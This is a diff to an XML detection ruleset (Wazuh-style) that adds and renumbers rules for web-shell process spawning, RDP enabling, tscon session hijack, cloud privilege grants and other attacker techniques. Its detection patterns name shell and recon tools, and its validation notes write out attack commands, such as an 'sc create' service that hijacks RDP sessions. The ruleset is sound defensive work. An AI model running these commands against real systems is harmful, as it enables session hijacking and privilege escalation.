+  </rule>
+</group>
+
+<!-- Web Server Process Spawns a Shell or Recon Tool  [rules/initial-access/web-server-spawns-shell.yml]
+     status: experimental
+-->
+<group name="sysmon,">
+  <rule id="100165" level="12">
+    <if_group>sysmon_event1</if_group>
+    <field name="win.eventdata.parentImage" type="pcre2">(?i)\\w3wp\.exe$|\\httpd\.exe$|\\nginx\.exe$|\\php\-cgi\.exe$|\\tomcat\.exe$|\\tomcat8\.exe$|\\tomcat9\.exe$|\\tomcat10\.exe$</field>
+    <field name="win.eventdata.image" type="pcre2">(?i)\\cmd\.exe$|\\powershell\.exe$|\\pwsh\.exe$|\\whoami\.exe$|\\net\.exe$|\\net1\.exe$|\\certutil\.exe$|\\bitsadmin\.exe$|\\rundll32\.exe$|\\cscript\.exe$|\\wscript\.exe$|\\mshta\.exe$</field>
+    <description>Web Server Process Spawns a Shell or Recon Tool</description>
+    <info type="text">Rule by Tyrian</info>
+    <info type="text">Validate (Atomic Red Team T1505.003): Drop a test ASPX web shell into an IIS site and request it with ?cmd=whoami, | or from an elevated prompt: C:\Windows\System32\inetsrv\w3wp.exe is not | launchable by hand, so use Atomic Red Team T1505.003 against a lab IIS.</info>
+    <mitre>
+      <id>T1190</id>
+      <id>T1505.003</id>
+    </mitre>
+    <options>no_full_log</options>
+  </rule>
+</group>
+
 <!-- Lateral Execution via DCOM Object  [rules/lateral-movement/dcom-lateral-execution.yml]
      status: stable
 -->
 <group name="sysmon,">
-  <rule id="100154" level="12">
+  <rule id="100166" level="12">
     <if_group>sysmon_event1</if_group>
     <field name="win.eventdata.parentImage" type="pcre2">(?i)\\mmc\.exe$|\\dllhost\.exe$</field>
     <field name="win.eventdata.image" type="pcre2">(?i)\\cmd\.exe$|\\powershell\.exe$|\\mshta\.exe$</field>
@@ -1008,7 +1228,7 @@
      status: experimental
 -->
 <group name="windows,windows_security,">
-  <rule id="100155" level="8">
+  <rule id="100167" level="8">
     <if_group>windows_security</if_group>
     <field name="win.system.eventID" type="pcre2">(?i)^4624$</field>
     <field name="win.eventdata.logonType" type="pcre2">(?i)^3$</field>
@@ -1030,7 +1250,7 @@
      NOTE: the source condition is a disjunction, so it compiles to 2 sibling rules below (any one of them firing means a hit).
 -->
 <group name="windows,windows_system,">
-  <rule id="100156" level="12">
+  <rule id="100168" level="12">
     <if_group>windows_system</if_group>
     <field name="win.system.eventID" type="pcre2">(?i)^7045$</field>
     <field name="win.eventdata.serviceName" type="pcre2">^[A-Za-z0-9]{8}$</field>
@@ -1045,7 +1265,7 @@
 </group>
 
 <group name="windows,windows_system,">
-  <rule id="100157" level="12">
+  <rule id="100169" level="12">
     <if_group>windows_system</if_group>
     <field name="win.system.eventID" type="pcre2">(?i)^7045$</field>
     <field name="win.eventdata.imagePath" type="pcre2">(?i)\\ADMIN\$\\|\\PSEXESVC|\\Windows\\Temp\\|\-s\ cmd</field>
@@ -1059,11 +1279,48 @@
   </rule>
 </group>
 
+<!-- Remote Desktop Enabled via Registry  [rules/lateral-movement/rdp-enabled-via-registry.yml]
+     status: experimental
+-->
+<group name="sysmon,">
+  <rule id="100170" level="8">
+    <if_group>sysmon_event1</if_group>
+    <field name="win.eventdata.targetObject" type="pcre2">(?i)\\Control\\Terminal\ Server\\fDenyTSConnections$</field>
+    <field name="win.eventdata.details" type="pcre2">(?i)^DWORD\ \(0x00000000\)$</field>
+    <description>Remote Desktop Enabled via Registry</description>
+    <info type="text">Rule by Tyrian</info>
+    <info type="text">Validate (Atomic Red Team T1021.001): reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f</info>
+    <mitre>
+      <id>T1021.001</id>
+      <id>T1112</id>
+    </mitre>
+    <options>no_full_log</options>
+  </rule>
+</group>
+
+<!-- RDP Session Hijack via tscon  [rules/lateral-movement/rdp-session-hijack-tscon.yml]
+     status: experimental
+-->
+<group name="sysmon,">
+  <rule id="100171" level="12">
+    <if_group>sysmon_event1</if_group>
+    <field name="win.eventdata.image" type="pcre2">(?i)\\tscon\.exe$</field>
+    <field name="win.eventdata.commandLine" type="pcre2">(?i)/dest:</field>
+    <description>RDP Session Hijack via tscon</description>
+    <info type="text">Rule by Tyrian</info>
+    <info type="text">Validate (Atomic Red Team T1563.002): query user | sc create sesshijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#0" &amp;&amp; net start sesshijack</info>
+    <mitre>
+      <id>T1563.002</id>
+    </mitre>
+    <options>no_full_log</options>
+  </rule>
+</group>
+
 <!-- Write to an Administrative Share  [rules/lateral-movement/smb-admin-share-write.yml]
      status: stable
 -->
 <group name="windows,windows_security,">
-  <rule id="100158" level="12">
+  <rule id="100172" level="12">
     <if_group>windows_security</if_group>
     <field name="win.system.eventID" type="pcre2">(?i)^5145$</field>
     <field name="win.eventdata.objectName" type="pcre2">(?i)ADMIN\$|C\$</field>
@@ -1082,7 +1339,7 @@
      status: experimental
 -->
 <group name="sysmon,">
-  <rule id="100159" level="8">
+  <rule id="100173" level="8">
     <if_group>sysmon_event1</if_group>
     <field name="win.eventdata.parentImage" type="pcre2">(?i)\\wsmprovhost\.exe$</field>
     <description>Remote Code Execution via WinRM and PowerShell Remoting</description>
@@ -1099,7 +1356,7 @@
      status: stable
 -->
 <group name="sysmon,">
-  <rule id="100160" level="12">
+  <rule id="100174" level="12">
     <if_group>sysmon_event1</if_group>
     <field name="win.eventdata.parentImage" type="pcre2">(?i)\\WmiPrvSE\.exe$</field>
     <field name="win.eventdata.image" type="pcre2">(?i)\\powershell\.exe$|\\pwsh\.exe$|\\cmd\.exe$|\\mshta\.exe$|\\rundll32\.exe$|\\regsvr32\.exe$|\\certutil\.exe$</field>
@@ -1117,7 +1374,7 @@
      status: experimental
 -->
 <group name="windows,windows_security,">
-  <rule id="100161" level="14">
+  <rule id="100175" level="14">
     <if_group>windows_security</if_group>
     <field name="win.system.eventID" type="pcre2">(?i)^5136$|^4662$</field>
     <field name="win.eventdata.objectDN" type="pcre2">(?i)CN=AdminSDHolder</field>
@@ -1132,12 +1389,66 @@
   </rule>
 </group>
 
+<!-- AWS AdministratorAccess Policy Attached  [rules/persistence/aws-iam-admin-policy-attached.yml]
+     status: experimental
+-->
+<group name="amazon,aws,">
+  <rule id="100176" level="12">
+    <if_group>amazon</if_group>
+    <field name="aws.eventSource" type="pcre2">(?i)^iam\.amazonaws\.com$</field>
+    <field name="aws.eventName" type="pcre2">(?i)^AttachUserPolicy$|^AttachRolePolicy$|^AttachGroupPolicy$</field>
+    <field name="aws.requestParameters.policyArn" type="pcre2">(?i):policy/AdministratorAccess$</field>
+    <description>AWS AdministratorAccess Policy Attached</description>
+    <info type="text">Rule by Tyrian</info>
+    <info type="text">Validate (Atomic Red Team T1098.003): aws iam attach-user-policy --user-name &lt;lab-user&gt; --policy-arn arn:aws:iam::aws:policy/AdministratorAccess</info>
+    <mitre>
+      <id>T1098.003</id>
+    </mitre>
+    <options>no_full_log</options>
+  </rule>
+</group>
+
+<!-- Entra ID Credentials Added to an Application or Service Principal  [rules/persistence/entra-app-credentials-added.yml]
+     status: experimental
+-->
+<group name="azure,">
+  <rule id="100177" level="8">
+    <if_group>azure</if_group>
+    <field name="OperationName" type="pcre2">(?i)Add\ service\ principal\ credentials|Certificates\ and\ secrets\ management</field>
+    <description>Entra ID Credentials Added to an Application or Service Principal</description>
+    <info type="text">Rule by Tyrian</info>
+    <info type="text">Validate (Atomic Red Team T1098.001): az ad app credential reset --id &lt;lab-app-id&gt; --append</info>
+    <mitre>
+      <id>T1098.001</id>
+    </mitre>
+    <options>no_full_log</options>
+  </rule>
+</group>
+
+<!-- Entra ID Privileged Directory Role Assigned  [rules/persistence/entra-privileged-role-assigned.yml]
+     status: experimental
+-->
+<group name="azure,">
+  <rule id="100178" level="12">
+    <if_group>azure</if_group>
+    <field name="OperationName" type="pcre2">(?i)^Add\ member\ to\ role$|^Add\ eligible\ member\ to\ role$|^Add\ member\ to\ role\ completed\ \(PIM\ activation\)$</field>
+    <field name="TargetResources" type="pcre2">(?i)Global\ Administrator|Privileged\ Role\ Administrator|Privileged\ Authentication\ Administrator|Application\ Administrator|Cloud\ Application\ Administrator|Security\ Administrator|Exchange\ Administrator</field>
+    <description>Entra ID Privileged Directory Role Assigned</description>
+    <info type="text">Rule by Tyrian</info>
+    <info type="text">Validate (Atomic Red Team T1098.003): New-MgRoleManagementDirectoryRoleAssignment -PrincipalId &lt;lab-user-id&gt; -RoleDefinitionId 62e90394-69f5-4237-9190-012177145e10 -DirectoryScopeId /</info>
+    <mitre>
+      <id>T1098.003</id>
+    </mitre>
+    <options>no_full_log</options>
+  </rule>
+</group>
+
 <!-- Linux Account Created or Added to a Privileged Group  [rules/persistence/linux-account-manipulation.yml]
      status: experimental
      NOTE: the source condition is a disjunction, so it compiles to 3 sibling rules below (any one of them firing means a hit).
 -->
 <group name="linux,audit,">
-  <rule id="100162" level="12">
+  <rule id="100179" level="12">
     <if_group>audit</if_group>
     <field name="audit.key" type="pcre2">(?i)^tyrian_exec$</field>
     <field name="audit.exe" type="pcre2">(?i)/useradd$|/adduser$</field>
@@ -1153,7 +1464,7 @@
 </group>
 
 <group name="linux,audit,">
-  <rule id="100163" level="12">
+  <rule id="100180" level="12">
     <if_group>audit</if_group>
     <field name="audit.key" type="pcre2">(?i)^tyrian_exec$</field>
     <field name="audit.exe" type="pcre2">(?i)/usermod$|/gpasswd$</field>
@@ -1170,7 +1481,7 @@
 </group>
 
 <group name="linux,audit,">
-  <rule id="100164" level="12">
+  <rule id="100181" level="12">
     <if_group>audit</if_group>
     <field name="audit.key" type="pcre2">(?i)^tyrian_passwd$</field>
     <description>Linux Account Created or Added to a Privileged Group (3/3: passwd_file_edit)</description>
@@ -1188,7 +1499,7 @@
      status: experimental
 -->
 <group name="linux,audit,">
-  <rule id="100165" level="12">
+  <rule id="100182" level="12">
     <if_group>audit</if_group>
     <field name="audit.key" type="pcre2">(?i)^tyrian_cron$</field>
     <description>Linux Scheduled Task Persistence via cron</description>
@@ -1205,7 +1516,7 @@
      status: experimental
 -->
 <group name="linux,audit,">
-  <rule id="100166" level="8">
+  <rule id="100183" level="8">
     <if_group>audit</if_group>
     <field name="audit.key" type="pcre2">(?i)^tyrian_modules$</field>
     <description>Linux Kernel Module Loaded</description>
@@ -1222,7 +1533,7 @@
      status: experimental
 -->
 <group name="linux,audit,">
-  <rule id="100167" level="14">
+  <rule id="100184" level="14">
     <if_group>audit</if_group>
     <field name="audit.key" type="pcre2">(?i)^tyrian_ldpreload$</field>
     <description>Linux Shared Library Hijack via ld.so.preload</description>
@@ -1239,7 +1550,7 @@
      status: experimental
 -->
 <group name="linux,audit,">
-  <rule id="100168" level="12">
+  <rule id="100185" level="12">
     <if_group>audit</if_group>
     <field name="audit.key" type="pcre2">(?i)^tyrian_ssh_keys</field>
     <field name="audit.file.name" type="pcre2">(?i)authorized_keys</field>
@@ -1257,7 +1568,7 @@
      status: experimental
 -->
 <group name="linux,audit,">
-  <rule id="100169" level="12">
+  <rule id="100186" level="12">
     <if_group>audit</if_group>
     <field name="audit.key" type="pcre2">(?i)^tyrian_systemd$</field>
     <description>Linux systemd Unit Created or Modified</description>
@@ -1270,11 +1581,29 @@
   </rule>
 </group>
 
+<!-- M365 Full Access Granted on a Mailbox  [rules/persistence/m365-mailbox-full-access-granted.yml]
+     status: experimental
+-->
+<group name="office365,">
+  <rule id="100187" level="8">
+    <if_group>office365</if_group>
+    <field name="office365.Operation" type="pcre2">(?i)^Add\-MailboxPermission$</field>
+    <field name="office365.Parameters" type="pcre2">(?i)FullAccess</field>
+    <description>M365 Full Access Granted on a Mailbox</description>
+    <info type="text">Rule by Tyrian</info>
+    <info type="text">Validate (Atomic Red Team T1098.002): Add-MailboxPermission -Identity &lt;lab-user&gt; -User &lt;other-user&gt; -AccessRights FullAccess</info>
+    <mitre>
+      <id>T1098.002</id>
+    </mitre>
+    <options>no_full_log</options>
+  </rule>
+</group>
+
 <!-- Account Added to a Privileged Local or Domain Group  [rules/persistence/new-local-admin-account.yml]
      status: stable
 -->
 <group name="windows,windows_security,">
-  <rule id="100170" level="12">
+  <rule id="100188" level="12">
     <if_group>windows_security</if_group>
     <field name="win.system.eventID" type="pcre2">(?i)^4728$|^4732$|^4756$</field>
     <description>Account Added to a Privileged Local or Domain Group</description>
@@ -1291,7 +1620,7 @@
      status: stable
 -->
 <group name="sysmon,">
-  <rule id="100171" level="8">
+  <rule id="100189" level="8">
     <if_group>sysmon_event1</if_group>
     <field name="win.eventdata.targetObject" type="pcre2">(?i)\\CurrentVersion\\Run\\|\\CurrentVersion\\RunOnce\\|\\CurrentVersion\\Policies\\Explorer\\Run\\</field>
     <description>Autorun Persistence via Registry Run Key</description>
@@ -1308,7 +1637,7 @@
      status: stable
 -->
 <group name="windows,windows_system,">
-  <rule id="100172" level="12">
+  <rule id="100190" level="12">
     <if_group>windows_system</if_group>
     <field name="win.system.eventID" type="pcre2">(?i)^7045$</field>
     <field name="win.eventdata.serviceFileName" type="pcre2">(?i)\\Temp\\|\\Users\\Public\\|\\AppData\\|\\ProgramData\\|powershell|cmd\.exe\ /c|rundll32</field>
@@ -1326,7 +1655,7 @@
      status: stable
 -->
 <group name="windows,">
-  <rule id="100173" level="12">
+  <rule id="100191" level="12">
     <if_group>windows</if_group>
     <field name="win.eventdata.image" type="pcre2">(?i)\\schtasks\.exe$|\\at\.exe$</field>
     <field name="win.eventdata.commandLine" type="pcre2">(?i)/create</field>
@@ -1345,7 +1674,7 @@
      status: stable
 -->
 <group name="sysmon,">
-  <rule id="100174" level="12">
+  <rule id="100192" level="12">
     <if_group>sysmon_event1</if_group>
     <field name="win.system.eventID" type="pcre2">(?i)^19$|^20$|^21$</field>
     <description>WMI Event Subscription Persistence</description>
@@ -1363,7 +1692,7 @@
      NOTE: the source condition is a disjunction, so it compiles to 2 sibling rules below (any one of them firing means a hit).
 -->
 <group name="windows,windows_security,">
-  <rule id="100175" level="12">
+  <rule id="100193" level="12">
     <if_group>windows_security</if_group>
     <field name="win.system.eventID" type="pcre2">(?i)^5136$</field>
     <field name="win.eventdata.objectClass" type="pcre2">(?i)^groupPolicyContainer$</field>
@@ -1378,7 +1707,7 @@
 </group>
 
 <group name="windows,windows_security,">
-  <rule id="100176" level="12">
+  <rule id="100194" level="12">
     <if_group>windows_security</if_group>
     <field name="win.system.eventID" type="pcre2">(?i)^5145$</field>
     <field name="win.eventdata.shareName" type="pcre2">(?i)SYSVOL</field>
@@ -1398,7 +1727,7 @@
      NOTE: the source condition is a disjunction, so it compiles to 3 sibling rules below (any one of them firing means a hit).
 -->
 <group name="linux,audit,">
-  <rule id="100177" level="14">
+  <rule id="100195" level="14">
     <if_group>audit</if_group>
     <field name="audit.key" type="pcre2">(?i)^tyrian_exec$</field>
     <field name="audit.exe" type="pcre2">(?i)/nsenter$</field>
@@ -1414,7 +1743,7 @@
 </group>
 
 <group name="linux,audit,">
-  <rule id="100178" level="14">
+  <rule id="100196" level="14">
     <if_group>audit</if_group>
     <field name="audit.key" type="pcre2">(?i)^tyrian_exec$</field>
     <field name="audit.execve.a2" type="pcre2">(?i)docker\.sock</field>
@@ -1429,7 +1758,7 @@
 </group>
 
 <group name="linux,audit,">
-  <rule id="100179" level="14">
+  <rule id="100197" level="14">
     <if_group>audit</if_group>
     <field name="audit.key" type="pcre2">(?i)^tyrian_exec$</field>
     <field name="audit.exe" type="pcre2">(?i)/docker$|/podman$</field>
@@ -1448,7 +1777,7 @@
      status: experimental
 -->
 <group name="linux,audit,">
-  <rule id="100180" level="12">
+  <rule id="100198" level="12">
     <if_group>audit</if_group>
     <field name="audit.key" type="pcre2">(?i)^tyrian_sudoers$</field>
     <description>Linux sudoers Policy Modified</description>
@@ -1461,11 +1790,31 @@
   </rule>
 </group>
 
+<!-- Logon With New Credentials (Logon Type 9)  [rules/privilege-escalation/new-credentials-logon-type-9.yml]
+     status: experimental
+-->
+<group name="windows,windows_security,">
+  <rule id="100199" level="8">
+    <if_group>windows_security</if_group>
+    <field name="win.system.eventID" type="pcre2">(?i)^4624$</field>
+    <field name="win.eventdata.logonType" type="pcre2">(?i)^9$</field>
+    <field name="win.eventdata.logonProcessName" type="pcre2">(?i)^seclogo$</field>
+    <description>Logon With New Credentials (Logon Type 9)</description>
+    <info type="text">Rule by Tyrian</info>
+    <info type="text">Validate (Atomic Red Team T1134.001): runas /netonly /user:CONTOSO\test cmd.exe</info>
+    <mitre>
+      <id>T1134.001</id>
+      <id>T1550.002</id>
+    </mitre>
+    <options>no_full_log</options>
+  </rule>
+</group>
+
 <!-- Resource-Based Constrained Delegation Configured on an Object  [rules/privilege-escalation/resource-based-constrained-delegation-write.yml]
      status: experimental
 -->
 <group name="windows,windows_security,">
-  <rule id="100181" level="14">
+  <rule id="100200" level="14">
     <if_group>windows_security</if_group>
     <field name="win.system.eventID" type="pcre2">(?i)^5136$</field>
     <field name="win.eventdata.attributeLDAPDisplayName" type="pcre2">(?i)^msDS\-AllowedToActOnBehalfOfOtherIdentity$</field>
@@ -1485,7 +1834,7 @@
      NOTE: the source condition is a disjunction, so it compiles to 2 sibling rules below (any one of them firing means a hit).
 -->
 <group name="windows,windows_security,">
-  <rule id="100182" level="12">
+  <rule id="100201" level="12">
     <if_group>windows_security</if_group>
     <field name="win.system.eventID" type="pcre2">(?i)^5136$</field>
     <field name="win.eventdata.attributeLDAPDisplayName" type="pcre2">(?i)^msDS\-AllowedToDelegateTo$</field>
@@ -1501,7 +1850,7 @@
 </group>
 
 <group name="windows,windows_security,">
-  <rule id="100183" level="12">
+  <rule id="100202" level="12">
     <if_group>windows_security</if_group>
     <field name="win.system.eventID" type="pcre2">(?i)^5136$</field>
     <field name="win.eventdata.attributeLDAPDisplayName" type="pcre2">(?i)^userAccountControl$</field>
@@ -1521,7 +1870,7 @@
      status: experimental
 -->
 <group name="sysmon,">
-  <rule id="100184" level="14">
+  <rule id="100203" level="14">
     <if_group>sysmon_event1</if_group>
     <field name="win.system.eventID" type="pcre2">(?i)^6$</field>
     <field name="win.eventdata.imageLoaded" type="pcre2">(?i)\\iqvw64e\.sys$|\\RTCore64\.sys$|\\gdrv\.sys$|\\dbutil_2_3\.sys$|\\DBUtilDrv2\.sys$|\\procexp152\.sys$|\\truesight\.sys$|\\viragt64\.sys$|\\aswArPot\.sys$|\\mhyprot2\.sys$</field>
